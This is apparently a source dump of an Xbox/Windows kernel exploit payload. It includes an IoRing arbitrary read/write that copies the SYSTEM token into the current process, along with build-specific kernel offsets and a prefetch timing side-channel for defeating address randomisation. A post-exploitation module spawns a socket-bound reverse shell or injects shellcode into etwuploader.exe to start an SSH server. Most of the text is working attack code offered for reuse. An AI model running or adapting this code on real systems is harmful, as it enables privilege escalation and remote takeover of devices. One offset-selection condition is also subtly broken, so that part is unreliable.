    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    int ret = ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    if (ret != 0)
    {
        return 0;
    }

    return 1;
}

void kwrite(UINT64 addr, PVOID data, SIZE_T size) {
    ioring_write(0x65007500, &pIoRing->RegBuffersCount, data, size);

}


int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
{
    int ret = -1;
    HANDLE hProc = NULL;
    ULONG64 ullSystemEPROCaddr = 0;
    ULONG64 ullTargEPROCaddr = 0;
    PVOID pFakeRegBuffers = NULL;
    _HIORING* phIoRing = NULL;
    ULONG64 ullSysToken = 0;
    char null[0x10] = { 0 };

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

    if (NULL == hProc)
    {
        ret = GetLastError();
        return ret;
    }

    ret = getobjptr(&ullSystemEPROCaddr, 4, 4);

    if (0 != ret)
    {
        return ret;
    }

    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        return 0;
    }

    pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * ulFakeRegBufferCnt);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        //wprintf(L"token read failed!\n");
        return 0;
    }

    ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        //  wprintf(L"token write failed\n");
    }

    UINT64 orig_val = nt_base + get_orig_sd_offset();
    ret = ioring_write(pFakeRegBuffers, nt_base + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));

    ioring_write(pFakeRegBuffers, &pIoRing->RegBuffersCount, &null, 0x10);

}

```

`collat_payload/nt_offsets.c`:

```c
#include "nt_offsets.h"

#include <Windows.h>

ULONG build_rev = 0;

VOID set_build_rev(ULONG rev)
{
	build_rev = rev;
}

UINT64 get_sd_ptr_offset()
{
	if (build_rev == 2864)
	{
		// 10.0.22621.2864
		return SD_PTR_OFFSET_2864;
	}
	else if (build_rev == 4478)
	{
		// 10.0.25398.4478
		return SD_PTR_OFFSET_4478;
	}
	else if (build_rev == 4908 || 4909)
	{
		// 10.0.25398.4908/4909
		return SD_PTR_OFFSET_4908;
	}

	return 0;
}

UINT64 get_orig_sd_offset()
{
	if (build_rev == 2864)
	{
		// 10.0.22621.2864
		return ORIG_SD_OFFSET_2864;
	}
	else if (build_rev == 4478)
	{
		// 10.0.25398.4478
		return ORIG_SD_OFFSET_4478;
	}
	else if (build_rev == 4908 || 4909)
	{
		// 10.0.25398.4908/4909
		return ORIG_SD_OFFSET_4908;
	}

	return 0;
}
```

`collat_payload/nt_offsets.h`:

```h
#ifndef _NT_OFFSETS
#define _NT_OFFSETS
#include <Windows.h>

// Offsets for SeMediumDaclSd / Pointer to SeMediumDaclSd

// PC
//#define ORIG_SD_OFFSET 0xd55f20
//#define SD_PTR_OFFSET 0xd55658

// Xbox - 10.0.22621.2864 - Base: 0xFFFFF8004009F000
#define ORIG_SD_OFFSET_2864 0xC0E48 // @ ntoskrnl.exe!0xFFFFF8004015FE48
#define SD_PTR_OFFSET_2864 0xC05F0  // @ ntoskrnl.exe!0xFFFFF8004015F5F0

// Xbox - 10.0.25398.4478 - Base: 0xFFFFF8004009F000
#define ORIG_SD_OFFSET_4478 0xC62B8 // @ ntoskrnl.exe!0xFFFFF800401652B8
#define SD_PTR_OFFSET_4478 0xC5A58  // @ ntoskrnl.exe!0xFFFFF80040164A58

// Xbox - 10.0.25398.4908/4909 - Base: 0xFFFFF8004009F000
#define ORIG_SD_OFFSET_4908 0xC62B8 // @ ntoskrnl.exe!0xFFFFF800401652B8
#define SD_PTR_OFFSET_4908 0xC5A48  // @ ntoskrnl.exe!0xFFFFF80040164A48

VOID set_build_rev(ULONG rev);
UINT64 get_sd_ptr_offset();
UINT64 get_orig_sd_offset();


#endif

```

`collat_payload/post_exploit.c`:

```c
#include "post_exploit.h"

#include <stdio.h>
#include <psapi.h>
#include <ws2tcpip.h>

#define POST_EXPLOIT_REVERSE_SHELL 0

typedef struct {
    const char* image_name;
    const char* image_args;
} SHELLCODE_ARGS;

void post_exploit_simple_reverse_shell(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
}

void post_exploit_spawn_ssh_server(SOCKET sock) {
    CHAR* cur_msg[0x200] = { 0 };

    // We leave this commented for easy debugging

    //// Spawn CMD using the sock for input and output
    //STARTUPINFO sinfo;
    //PROCESS_INFORMATION pinfo;

    //memset(&sinfo, 0, sizeof(sinfo));
    //memset(&pinfo, 0, sizeof(pinfo));

    //sinfo.cb = sizeof(sinfo);
    //sinfo.dwFlags = STARTF_USESTDHANDLES;
    //sinfo.hStdError = (HANDLE)sock;
    //sinfo.hStdInput = (HANDLE)sock;
    //sinfo.hStdOutput = (HANDLE)sock;

    //sprintf(cur_msg, "Creating conhost process\n");
    //send(sock, cur_msg, strlen(cur_msg), 0);

    //CreateProcessA(NULL, "conhost.exe", NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &sinfo, &pinfo);

    //HANDLE target_process = pinfo.hProcess;
    //DWORD target_pid = pinfo.dwProcessId;

    // TO REMOVE ETWUPLOADER INJECTION, COMMENT FROM HERE TO NEXT MARKER

    HANDLE target_process = INVALID_HANDLE_VALUE;
    DWORD target_pid = -1;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    sprintf(cur_msg, "Enumerating processes\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        sprintf(cur_msg, "EnumProcessesFailed, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    for (i = 0; i < cProcesses; i++)
    {
        DWORD pid = aProcesses[i];
        if (pid != 0)
        {
            CHAR szProcessName[MAX_PATH] = "<unknown>";

            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,
                FALSE, pid);

            if (NULL != hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
                    &cbNeeded))
                {
                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(CHAR));
                }

                //sprintf(cur_msg, "Process: %s\n", szProcessName);
                //send(sock, cur_msg, strlen(cur_msg), 0);

                if (strcmp(szProcessName, "etwuploader.exe") == 0) {
                    sprintf(cur_msg, "Found etwuploader.exe (PID: %u, HANDLE: %p)\n", pid, hProcess);
                    send(sock, cur_msg, strlen(cur_msg), 0);

                    target_process = hProcess;
                    target_pid = pid;

                    break;
                }

                CloseHandle(hProcess);
            }
        }
    }

    // MARKER

    sprintf(cur_msg, "Injecting SSH server into PID: %d\n", target_pid);
    send(sock, cur_msg, strlen(cur_msg), 0);

    CHAR stage2_path[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\stage2.bin", stage2_path, sizeof(stage2_path));

    sprintf(cur_msg, "Loading stage2 from: %s\n", stage2_path);
    send(sock, cur_msg, strlen(cur_msg), 0);

    HANDLE filehandle = CreateFileA(stage2_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
    if (filehandle == INVALID_HANDLE_VALUE) {
        sprintf(cur_msg, "Failed to load stage2, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    DWORD file_size = GetFileSize(filehandle, NULL);
    if (file_size <= 0) {
        sprintf(cur_msg, "GetFileSize failed, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
    }

    sprintf(cur_msg, "Allocating memory (%u bytes) for the shellcode in the remote process\n", file_size);
    send(sock, cur_msg, strlen(cur_msg), 0);

    LPVOID shellcode_addr = VirtualAllocEx(target_process, 0, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (shellcode_addr == NULL) {
        sprintf(cur_msg, "Failed to allocate memory for shellcode in remote process, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }
    HANDLE h_heap = GetProcessHeap();
    if (h_heap == INVALID_HANDLE_VALUE || h_heap == NULL) {
        sprintf(cur_msg, "Failed to get process heap, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }
    BYTE* shellcode_data = HeapAlloc(h_heap, 0, file_size);
    if (shellcode_data == INVALID_HANDLE_VALUE || shellcode_data == NULL) {
        sprintf(cur_msg, "Failed to heap allocate, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }


    DWORD remaining = file_size;
    DWORD bytes_read = 0;

    while (remaining > 0) {
        ReadFile(filehandle, shellcode_data + (file_size - remaining), remaining, &bytes_read, NULL);
        remaining -= bytes_read;
    }

    CloseHandle(filehandle);

    sprintf(cur_msg, "Writing shellcode\n");
    send(sock, cur_msg, strlen(cur_msg), 0);
    BOOL bSuccess = WriteProcessMemory(target_process, shellcode_addr, shellcode_data, file_size, NULL);
    if (!bSuccess) {
        sprintf(cur_msg, "Failed WriteProcessMemory, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    sprintf(cur_msg, "VirtualProtecting shellcode\n");
    send(sock, cur_msg, strlen(cur_msg), 0);
    DWORD old_protection = 0;
    bSuccess = VirtualProtectEx(target_process, shellcode_addr, file_size, PAGE_EXECUTE_READ, &old_protection);
    if (!bSuccess) {
        sprintf(cur_msg, "Failed VirtualProtect, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    char srv_name[0x200] = { 0 };
    DWORD result = ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\srv.exe", srv_name, sizeof(srv_name));
    if (result == 0) {
        sprintf(cur_msg, "Failed ExpandEnvironmentStringsA, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }


    sprintf(cur_msg, "New process to be started: %s\n", srv_name);
    send(sock, cur_msg, strlen(cur_msg), 0);

    LPVOID image_name = VirtualAllocEx(target_process, 0, sizeof(srv_name), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (image_name == NULL) {
        sprintf(cur_msg, "Failed VirtualAllocEx, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    bSuccess = WriteProcessMemory(target_process, image_name, srv_name, sizeof(srv_name), NULL);
    if (!bSuccess) {
        sprintf(cur_msg, "Failed WriteProcessMemory, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    SHELLCODE_ARGS args = {
        image_name,
        NULL,
    };

    LPVOID args_addr = VirtualAllocEx(target_process, 0, sizeof(args), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (args_addr == NULL) {
        sprintf(cur_msg, "Failed VirtualAllocEx, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }
    sprintf(cur_msg, "Args will be allocated at: %p\n", args_addr);
    send(sock, cur_msg, strlen(cur_msg), 0);

    bSuccess = WriteProcessMemory(target_process, args_addr, &args, sizeof(args), NULL);
    if (!bSuccess) {
        sprintf(cur_msg, "Failed WriteProcessMemory, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    sprintf(cur_msg, "Creating remote thread\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    HANDLE thread_handle = CreateRemoteThread(target_process, NULL, 0, shellcode_addr, args_addr, 0, NULL);
    if (thread_handle == INVALID_HANDLE_VALUE) {
        sprintf(cur_msg, "Failed CreateRemoteThread, error: 0x%x\n", GetLastError());
        send(sock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }
    //ResumeThread(thread_handle);
    sprintf(cur_msg, "Remote thread HANDLE: %p\n", thread_handle);
    send(sock, cur_msg, strlen(cur_msg), 0);

    sprintf(cur_msg, "Collat payload is done! See the payload server instructions for how to connect\n");
    send(sock, cur_msg, strlen(cur_msg), 0);

    // Close the socket so the other side knows we're done
    shutdown(sock, SD_BOTH);
    closesocket(sock);
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock)
{
#if POST_EXPLOIT_REVERSE_SHELL
    post_exploit_simple_reverse_shell(sock);
#else
    post_exploit_spawn_ssh_server(sock);
#endif

    // Loop forever
    while (1) {}
}

```

`collat_payload/post_exploit.h`:

```h
#ifndef _POST_EXPLOIT_H
#define _POST_EXPLOIT_H
#include <winsock2.h>

void post_exploit(SOCKET sock);

#endif

```

`collat_payload/prefetch_asm.asm`:

```asm
; -----------------------------------------------------------------------------------------------------------	
; based on entrybleed (https://www.willsroot.io/2022/12/entrybleed.html)
; adapted to windows by exploits.forsale
; assembly based on example by Elias Bachaalany <lallousz-x86@yahoo.com> http://lallouslab.net


; -----------------------------------------------------------------------------------------------------------	
; Exported symbols
PUBLIC sidechannel
PUBLIC bad_syscall

; -----------------------------------------------------------------------------------------------------------	
; Text segment
; -----------------------------------------------------------------------------------------------------------	
_TEXT	SEGMENT


sidechannel PROC
	push rbx
	push rsi
	push rdi
	mov rsi, rcx ; save the address away

	mfence
	rdtscp
	mov r9, rax
	mov r8, rdx
	xor rax, rax
	lfence

	prefetchnta byte ptr [rsi]
	prefetcht2 byte ptr [rsi]

	lfence
	rdtscp
	mov rdi, rax
	mov rsi, rdx

	mfence

	mov rbx, r8
	shl rbx, 32
	or rbx, r9

	mov rax, rsi
	shl rax, 32
	or rax, rdi

	sub rax, rbx
	pop rdi
	pop rsi
	pop rbx
	ret
sidechannel ENDP

bad_syscall PROC
	mov rax, 99999
	syscall
	ret
bad_syscall ENDP


_TEXT	ENDS

END
```

`collat_payload/win_defs.h`:

```h
#ifndef _WIN_DEFS_H_
#define _WIN_DEFS_H_
#include <Windows.h>
#include <winternl.h>

#define SystemHandleInformation 16

#define EPROC_TOKEN_OFFSET 0x4b8

#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    unsigned short UniqueProcessId;
    unsigned short CreatorBackTraceIndex;
    unsigned char ObjectTypeIndex;
    unsigned char HandleAttributes;
    unsigned short HandleValue;
    void* Object;
    unsigned long GrantedAccess;
    long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    unsigned long NumberOfHandles;
    struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _DISPATCHER_HEADER
{
    union
    {
        volatile long Lock;
        long LockNV;
        struct
        {
            unsigned char Type;
            unsigned char Signalling;
            unsigned char Size;
            unsigned char Reserved1;
        };
        struct
        {
            unsigned char TimerType;
            union
            {
                unsigned char TimerControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Absolute : 1;
                        unsigned char Wake : 1;
                        unsigned char EncodedTolerableDelay : 6;
                    };
                    unsigned char Hand;
                    union
                    {
                        unsigned char TimerMiscFlags;
                        struct
                        {
                            unsigned char Index : 6;
                            unsigned char Inserted : 1;
                            volatile unsigned char Expired : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char Timer2Type;
            union
            {
                unsigned char Timer2Flags;
                struct
                {
                    struct
                    {
                        unsigned char Timer2Inserted : 1;
                        unsigned char Timer2Expiring : 1;
                        unsigned char Timer2CancelPending : 1;
                        unsigned char Timer2SetPending : 1;
                        unsigned char Timer2Running : 1;
                        unsigned char Timer2Disabled : 1;
                        unsigned char Timer2ReservedFlags : 2;
                    };
                    unsigned char Timer2ComponentId;
                    unsigned char Timer2RelativeId;
                };
            };
        };
        struct
        {
            unsigned char QueueType;
            union
            {
                unsigned char QueueControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char Abandoned : 1;
                        unsigned char DisableIncrement : 1;
                        unsigned char QueueReservedControlFlags : 6;
                    };
                    unsigned char QueueSize;
                    unsigned char QueueReserved;
                };
            };
        };
        struct
        {
            unsigned char ThreadType;
            unsigned char ThreadReserved;
            union
            {
                unsigned char ThreadControlFlags;
                struct
                {
                    struct
                    {
                        unsigned char CycleProfiling : 1;
                        unsigned char CounterProfiling : 1;
                        unsigned char GroupScheduling : 1;
                        unsigned char AffinitySet : 1;
                        unsigned char Tagged : 1;
                        unsigned char EnergyProfiling : 1;
                        unsigned char SchedulerAssist : 1;
                        unsigned char ThreadReservedControlFlags : 1;
                    };
                    union
                    {
                        unsigned char DebugActive;
                        struct
                        {
                            unsigned char ActiveDR7 : 1;
                            unsigned char Instrumented : 1;
                            unsigned char Minimal : 1;
                            unsigned char Reserved4 : 2;
                            unsigned char AltSyscall : 1;
                            unsigned char Emulation : 1;
                            unsigned char Reserved5 : 1;
                        };
                    };
                };
            };
        };
        struct
        {
            unsigned char MutantType;
            unsigned char MutantSize;
            unsigned char DpcActive;
            unsigned char MutantReserved;
        };
    };
    long SignalState;
    LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;

typedef struct _KEVENT
{
    struct _DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT;


//NTSYSCALLAPI NTSTATUS NTAPI NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
//NTSYSCALLAPI NTSTATUS NTAPI NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
NTSYSCALLAPI NTSTATUS NTAPI NtCreateIoCompletion(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG NumberOfConcurrentThreads);
NTSYSCALLAPI
NTSTATUS
NTAPI NtSetIoCompletion(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransferred);

/*NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySystemInformation(
    _In_ DWORD SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);*/

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
);

// Types

#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INVALID 0x00
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_INT64 0x01
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_UINT64 0x02
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_STRING 0x03
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_FQBN 0x04
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_SID 0x05
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_BOOLEAN 0x06
#define TOKEN_SECURITY_ATTRIBUTE_TYPE_OCTET_STRING 0x10

// Flags

#define TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE 0x0001
#define TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE 0x0002
#define TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY 0x0004
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT 0x0008
#define TOKEN_SECURITY_ATTRIBUTE_DISABLED 0x0010
#define TOKEN_SECURITY_ATTRIBUTE_MANDATORY 0x0020
#define TOKEN_SECURITY_ATTRIBUTE_COMPARE_IGNORE 0x0040

#define TOKEN_SECURITY_ATTRIBUTE_VALID_FLAGS ( \
    TOKEN_SECURITY_ATTRIBUTE_NON_INHERITABLE | \
    TOKEN_SECURITY_ATTRIBUTE_VALUE_CASE_SENSITIVE | \
    TOKEN_SECURITY_ATTRIBUTE_USE_FOR_DENY_ONLY | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED_BY_DEFAULT | \
    TOKEN_SECURITY_ATTRIBUTE_DISABLED | \
    TOKEN_SECURITY_ATTRIBUTE_MANDATORY)

#define TOKEN_SECURITY_ATTRIBUTE_CUSTOM_FLAGS 0xffff0000

// end_rev

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE
{
    ULONG64 Version;
    UNICODE_STRING Name;
} TOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE, * PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE;

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE
{
    PVOID pValue;
    ULONG ValueLength;
} TOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE, * PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE;

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTE_V1
{
    UNICODE_STRING Name;
    USHORT ValueType;
    USHORT Reserved;
    ULONG Flags;
    ULONG ValueCount;
    union
    {
        PLONG64 pInt64;
        PULONG64 pUint64;
        PUNICODE_STRING pString;
        PTOKEN_SECURITY_ATTRIBUTE_FQBN_VALUE pFqbn;
        PTOKEN_SECURITY_ATTRIBUTE_OCTET_STRING_VALUE pOctetString;
    } Values;
} TOKEN_SECURITY_ATTRIBUTE_V1, * PTOKEN_SECURITY_ATTRIBUTE_V1;

// rev
#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1 1
// rev
#define TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION TOKEN_SECURITY_ATTRIBUTES_INFORMATION_VERSION_V1

// private
typedef struct _TOKEN_SECURITY_ATTRIBUTES_INFORMATION
{
    USHORT Version;
    USHORT Reserved;
    ULONG AttributeCount;
    union
    {
        PTOKEN_SECURITY_ATTRIBUTE_V1 pAttributeV1;
    } Attribute;
} TOKEN_SECURITY_ATTRIBUTES_INFORMATION, * PTOKEN_SECURITY_ATTRIBUTES_INFORMATION;

// private
typedef union _SYSTEM_BUILD_VERSION_INFORMATION_FLAGS
{
    ULONG Value32;
    struct
    {
        ULONG IsTopLevel : 1;
        ULONG IsChecked : 1;
    };
} SYSTEM_BUILD_VERSION_INFORMATION_FLAGS, * PSYSTEM_BUILD_VERSION_INFORMATION_FLAGS;

// private
typedef struct _SYSTEM_BUILD_VERSION_INFORMATION
{
    USHORT LayerNumber;
    USHORT LayerCount;
    ULONG OsMajorVersion;
    ULONG OsMinorVersion;
    ULONG NtBuildNumber;
    ULONG NtBuildQfe;
    UCHAR LayerName[128];
    UCHAR NtBuildBranch[128];
    UCHAR NtBuildLab[128];
    UCHAR NtBuildLabEx[128];
    UCHAR NtBuildStamp[26];
    UCHAR NtBuildArch[16];
    SYSTEM_BUILD_VERSION_INFORMATION_FLAGS Flags;
} SYSTEM_BUILD_VERSION_INFORMATION, * PSYSTEM_BUILD_VERSION_INFORMATION;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySystemInformationEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _In_reads_bytes_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);


#endif

```

`collat_payload/winrt.c`:

```c
// Send toast notifications in Windows 10, using Windows Runtime,
// without any language projection, in PLAIN C
// Copyright (c) 2021 Valentin - Gabriel Radu
//
// MIT License
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this softwareand associated documentation files(the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and /or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions :
// The above copyright noticeand this permission notice shall be included in all
// copies or substantial portions of the Software.
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Due to the long struct names and because I don't want to abstractize and 
// typedef structs which has the potential to obfuscate the code, I decided to
// stick to 120 character lines for this document, instead of 80
//
// Set project Properties - Configuration Properties - Linker - All Options -
// - Additional Dependencies - runtimeobject.lib
// #pragma comment(lib, "runtimeobject.lib") does not work when compiled 
// without default lib for whatever reason
//
// Set project Properties - Configuration Properties - Linker - All Options - 
// - SubSystem - Windows or change to Console
// and modify the entry point and the signature of "main"
// the pragma belowis optional
//
// This code is basically the example provided by Microsoft without all the 
// bloat around it and written in plain C instead of C++, of course
// https://github.com/microsoft/Windows-classic-samples/blob/master/Samples/DesktopToasts/CPP/DesktopToastsSample.cpp
//
// Also, I have taken out the COM activator part; maybe I will port over that
// in the future, but for my use case, I don't really need it; the 
// notifications still persist in Action Center and I fire my app with a 
// protocol; this has the advantage that you DO NOT have to install a shortcut 
// in the Start menu and can use the shortcut of any application that has a
// shortcut in Start with an AppUserModelId; this is great if you do a plugin 
// for an app, so you do not really need a shortcut of your own to clutter the
// Start menu. 
// Also, the COM activator is required for buttons on the toast.
// To see the IDs for installed apps, run "Get-StartApps" in PowerShell.
//
#include "winrt.h"

//#define Done(code) ExitProcess(code)

/* Toasts */

// Windows.Xbox.UI.Internal.ToastNotifications.IToastManager
// IToastManager: 944FEE54-68BA-4CBE-8541-08122DBE3A4A
// IToastmanagerInternal: 154762D0-7895-45AF-BA7B-A1DAE10E07E3
DEFINE_GUID(UIID_XboxUIInternalToastNotificationsIToastManager,
	0x944FEE54,
	0x68BA, 0x4CBE, 0x85, 0x41,
	0x08, 0x12, 0x2D, 0xBE, 0x3A, 0x4A
);

// UUIDs obtained from <windows.ui.notifications.h>
//
// ABI.Windows.UI.Notifications.IToastNotificationManagerStatics
// 50ac103f-d235-4598-bbef-98fe4d1a3ad4
DEFINE_GUID(UIID_IToastNotificationManagerStatics,
	0x50ac103f,
	0xd235, 0x4598, 0xbb, 0xef,
	0x98, 0xfe, 0x4d, 0x1a, 0x3a, 0xd4
);
//
